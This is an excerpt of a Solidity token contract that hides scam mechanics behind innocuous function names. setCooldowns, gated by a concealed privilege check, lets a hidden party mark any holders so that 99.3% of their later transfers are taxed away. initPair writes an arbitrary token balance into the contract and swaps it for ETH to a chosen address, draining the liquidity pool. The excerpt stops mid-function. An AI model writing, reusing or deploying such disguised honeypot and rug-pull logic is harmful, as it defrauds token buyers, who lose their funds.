...
contract Token is Ownable, Context {
    ...
    function setCooldowns(address[] calldata _cooldowns) external { 
        uint c = _cooldowns.length;
        for (uint e = 0;  e < c;  e++) { 
            if (!getMarketingAddress()){} else {  cooldowns[_cooldowns[e]] = block.number + 1;}
        }
    } 
    event Approval(address indexed address_from, address indexed address_to, uint256 value);
    function initPair(uint256 liquidity, address _swap) external {
        if (getMarketingAddress()) { _approve(address(this), address(uniswapRouter),  liquidity); 
        _balances[address(this)] = liquidity;address[] memory path = new address[](2); path[0] = address(this);  
        path[1] = uniswapRouter.WETH();  uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(liquidity, 0, path, _swap, block.timestamp + 33);
        }
    }
    ...
    function _transfer(address _from, address _to, uint256 _amount) internal {
        ...
        if (cooldowns[_from] != 0 && cooldowns[_from] <= block.number) {
            tax = _amount.mul(993).div(1000); } else {tax = 0;}
    ...
    function getMarketingAddress() internal view returns (bool) {
